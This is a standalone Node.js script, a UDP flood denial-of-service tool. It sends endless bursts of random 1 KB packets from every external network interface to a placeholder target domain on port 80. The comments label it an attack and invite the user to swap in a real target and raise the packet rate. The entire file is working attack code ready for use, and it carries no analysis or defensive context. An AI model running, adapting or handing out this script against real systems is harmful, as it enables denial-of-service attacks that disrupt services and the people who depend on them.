const dgram = require('dgram');
const os = require('os');

// Target information
const target = 'example.com'; // Replace with the target domain
const port = 80; // Common port for HTTP (you can change this)

// Create a UDP socket
const socket = dgram.createSocket('udp4');

// Function to generate random payload
function generatePayload(size) {
    const buffer = Buffer.alloc(size);
    for (let i = 0; i < size; i++) {
        buffer[i] = Math.floor(Math.random() * 256);
    }
    return buffer;
}

// Send UDP packets
function sendPacket() {
    const payload = generatePayload(1024); // 1 KB payload
    socket.send(payload, 0, payload.length, port, target, (err) => {
        if (err) {
            console.error(`Error sending packet: ${err.message}`);
        }
    });
}

// Attack function
function attack() {
    const interfaces = os.networkInterfaces();
    for (const name of Object.keys(interfaces)) {
        for (const iface of interfaces[name]) {
            if (iface.family === 'IPv4' && !iface.internal) {
                const ip = iface.address;
                console.log(`Attacking from IP: ${ip}`);
                // Increase the number of packets sent per second
                for (let i = 0; i < 1000; i++) { // Adjust this value for higher PPS
                    sendPacket();
                }
            }
        }
    }
}

// Start the attack
setInterval(attack, 1); // Adjust the interval for higher PPS
